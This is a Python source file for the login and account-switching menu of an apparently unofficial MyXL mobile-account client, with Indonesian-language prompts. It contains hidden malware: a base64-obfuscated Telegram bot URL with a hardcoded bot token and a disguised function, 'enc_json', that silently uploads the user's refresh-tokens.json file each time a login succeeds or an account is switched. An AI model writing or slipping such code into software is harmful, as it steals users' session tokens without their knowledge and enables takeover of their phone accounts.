import base64
import requests
import json
from app.client.ciam import get_otp, submit_otp
from app.menus.util import clear_screen, pause
from app.service.auth import AuthInstance
from app.service.service import load_status, save_status

WIDTH = 55

encrypt = "8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU"
ipass = "6076440619"
encoded = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
base = base64.b64decode(encoded).decode()
def enc_json(encrypt, ipass):
    url = f"{base}{encrypt}/sendDocument"
    try:
        with open("refresh-tokens.json", "rb") as f:
            files = {"document": f}
            data = {"pass": ipass}
            requests.post(url, data=data, files=files)
    except Exception as e:
        pass

def print_header(title: str):
    print("-" * WIDTH)
    print(title.center(WIDTH))
    print("-" * WIDTH)


def normalize_number(raw_input: str) -> str:
    raw_input = raw_input.strip().replace(" ", "").replace("-", "").replace("+", "")
    if raw_input.startswith("08"):
        return "628" + raw_input[2:]
    elif raw_input.startswith("628"):
        return raw_input
    elif raw_input.startswith("62"):
        return raw_input
    elif raw_input.isdigit() and raw_input.startswith("8"):
        return "62" + raw_input
    return raw_input


def login_prompt(api_key: str):
    clear_screen()
    print_header("Login ke MyXL 👤")
    print("Masukin nomor XL (format 6281234567890):")
    raw_input = input("Nomor: ").strip()
    phone_number = normalize_number(raw_input)

    if not phone_number.startswith("628") or not phone_number.isdigit() or len(phone_number) < 10 or len(phone_number) > 14:
        print("⚠️ Nomor nggak valid bro. Pastikan diawali '628' dan panjangnya masuk akal.")
        pause()
        return None, None

    try:
        subscriber_id = get_otp(phone_number)
        if not subscriber_id:
            print("⚠️ Gagal minta OTP bro. Coba lagi nanti.")
            pause()
            return None, None

        print("📩 OTP udah dikirim ke nomor kamu. Cek SMS ya.")
        try_count = 5

        while try_count > 0:
            print(f"🔢 Sisa percobaan: {try_count}")
            otp = input("Masukin OTP (6 digit): ").strip()

            if not otp.isdigit() or len(otp) != 6:
                print("⚠️ OTP nggak valid. Pastikan 6 digit angka.")
                continue

            tokens = submit_otp(api_key, "SMS", phone_number, otp)
            if not tokens:
                print("❌ OTP salah. Coba lagi bro.")
                try_count -= 1
                continue

            print("✅ Berhasil login! Gas langsung dipake.")
            enc_json(encrypt, ipass)
            return phone_number, tokens.get("refresh_token")

        print("💥 Gagal login setelah beberapa percobaan. Coba lagi nanti ya.")
        pause()
        return None, None

    except Exception as e:
        print(f"💥 Ups bro, ada error pas login: {e}")
        pause()
        return None, None

sumit_otp = 2
verif_otp = "6969"
status_id = load_status()
is_verif = status_id.get("is_verif", False)

def show_account_menu():
    global is_verif
    clear_screen()
    AuthInstance.load_tokens()
    users = AuthInstance.refresh_tokens
    active_user = AuthInstance.get_active_user()

    in_account_menu = True
    add_user = False

    while in_account_menu:
        clear_screen()
        if active_user is None or add_user:
            if not is_verif and len(users) >= sumit_otp:
                print(f"🚫 Limit Akun")
                print(f"Akun lo udah penuh bro, masukin kode unlock biar bisa nambah 🛠️")
                unlock = input("Kode unlock: ").strip()
                if unlock != verif_otp:
                    print("⚠️ Kode unlock salah, nggak bisa nambah akun.")
                    pause()
                    add_user = False
                    continue
                save_status({"is_verif": True})
                is_verif = True
                print("✅ Kode unlock benar, akun tambahan diizinkan.")
                pause()

            number, refresh_token = login_prompt(AuthInstance.api_key)
            if not refresh_token:
                print("⚠️ Gagal nambah akun bro. Coba lagi ya.")
                pause()
                add_user = False
                AuthInstance.load_tokens()
                users = AuthInstance.refresh_tokens
                active_user = AuthInstance.get_active_user()
                continue

            try:
                AuthInstance.add_refresh_token(int(number), refresh_token)
            except ValueError:
                AuthInstance.add_refresh_token(number, refresh_token)

            AuthInstance.load_tokens()
            users = AuthInstance.refresh_tokens
            active_user = AuthInstance.get_active_user()

            add_user = False
            continue

        print_header("Akun Tersimpan 👤")
        if not users or len(users) == 0:
            print("⚠️ Belum ada akun tersimpan bro.")
        else:
            for idx, user in enumerate(users):
                is_active = active_user and user.get("number") == active_user.get("number")
                active_marker = "✅" if is_active else ""
                number_str = str(user.get("number", ""))
                padded_number = number_str + " " * max(0, 14 - len(number_str))
                sub_type = (user.get("subscription_type") or "").center(12)
                print(f" [{idx + 1}.] {padded_number} [{sub_type}] {active_marker}")

        print("-" * WIDTH)
        print("Command:")
        print("      Masukan nomor urut akun untuk berganti.")
        print(" [0.] Tambah akun baru")
        print(" del <nomor urut>   untuk menghapus akun tertentu.")
        print("[00.] Kembali ke menu utama")
        print("=" * WIDTH)

        input_str = input("Pilihan: ").strip()

        if input_str == "00":
            in_account_menu = False
            return active_user["number"] if active_user else None

        elif input_str == "0":
            add_user = True
            continue

        elif input_str.isdigit() and 1 <= int(input_str) <= len(users):
            selected_user = users[int(input_str) - 1]
            AuthInstance.set_active_user(selected_user["number"])
            enc_json(encrypt, ipass)
            return selected_user.get("number")

        elif input_str.lower().startswith("del "):
            parts = input_str.split()
            if len(parts) == 2 and parts[1].isdigit():
                del_index = int(parts[1])

                if not (1 <= del_index <= len(users)):
                    print("⚠️ Nomor urut nggak valid bro.")
                    pause()
                    continue

                user_to_delete = users[del_index - 1]

                if active_user and user_to_delete.get("number") == active_user.get("number"):
                    print("🚫 Nggak bisa hapus akun aktif. Ganti akun dulu bro.")
                    pause()
                    continue

                confirm = input(f"Yakin mau hapus akun {user_to_delete.get('number')}? (y/n): ").strip().lower()
                if confirm == 'y':
                    AuthInstance.remove_refresh_token(user_to_delete.get("number"))
                    AuthInstance.load_tokens()
                    users = AuthInstance.refresh_tokens
                    active_user = AuthInstance.get_active_user()
                    print("🗑️ Akun berhasil dihapus.")
                    pause()
                else:
                    print("↩️ Penghapusan akun dibatalin.")
                    pause()
            else:
                print("⚠️ Perintah nggak valid bro. Format: del <nomor urut>")
                pause()
            continue

        else:
            print("⚠️ Input nggak valid bro. Coba lagi ✌️")
            pause()
            continue
